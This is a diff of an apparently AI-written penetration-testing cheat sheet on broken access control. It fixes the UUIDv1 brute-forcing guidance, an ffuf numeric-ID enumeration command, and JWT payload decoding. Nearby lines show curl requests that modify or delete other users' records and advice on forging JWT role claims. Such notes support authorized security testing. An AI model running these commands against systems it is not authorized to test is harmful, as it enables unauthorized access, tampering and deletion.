@@ -133,11 +133,14 @@ UUIDs look random but may not be — v1 UUIDs are time-based and bruteforceable 
 # GET /api/invoice/3f2504e0-4f89-11d3-9a0c-0305e82c3301  ← v1 (time-based)
 # GET /api/invoice/550e8400-e29b-41d4-a716-446655440000  ← v4 (random)
 
-# UUIDv1 brute: generate UUIDs for a target timestamp window
+# UUIDv1 brute: uuid.uuid1() only stamps the CURRENT time — you can't backdate its
+# timestamp/clock-seq fields this way. To brute a known creation window, use a tool
+# that crafts those fields (e.g. guidtool / uuidv1-tools) seeded from a created_at value:
+#   guidtool -t "2026-07-21 14:30:00" -p 100 <sample-uuid>
 python3 - << 'EOF'
-import uuid, time
-# Generate v1 UUIDs around a known creation time (e.g., from a "created_at" field)
-for i in range(100):
+import uuid
+# Illustrative only — these are all stamped at "now", not a target window:
+for i in range(5):
     print(uuid.uuid1())
 EOF
 
@@ -152,7 +155,7 @@ EOF
 
 ```bash
 # ffuf numeric ID enum
-ffuf -w <(seq 1 500 | tr '\n' '\n') -u "http://<target>/api/users/FUZZ" -mc 200 -v
+ffuf -w <(seq 1 500) -u "http://<target>/api/users/FUZZ" -mc 200 -v
 
 # Burp Intruder: Sniper on the ID parameter, number payload 1-1000
 
@@ -185,8 +188,8 @@ curl -s -X PUT -H "Authorization: Bearer <token>" -H "Content-Type: application/
 curl -s -X DELETE -H "Authorization: Bearer <token>" "http://<target>/api/users/2"
 
 # Check if role field is user-controlled (in cookies/JWT/JSON)
-# Decode JWT payload:
-echo "<jwt_payload>" | base64 -d 2>/dev/null | python3 -m json.tool
+# Decode JWT payload (base64URL → translate -_ to +/ first):
+echo "<jwt_payload>" | tr '_-' '/+' | base64 -d 2>/dev/null | python3 -m json.tool
 # If role is in JWT and not signed properly → change role and re-encode
 ```
 
@@ -507,5 +510,5 @@ curl -s -X POST "http://<target>/endpoint" -H "Content-Type: application/xml" -d
 ---
 
 *Created: 2026-03-04*
-*Updated: 2026-05-14*
+*Updated: 2026-07-21*
 *Model: claude-sonnet-4-6*
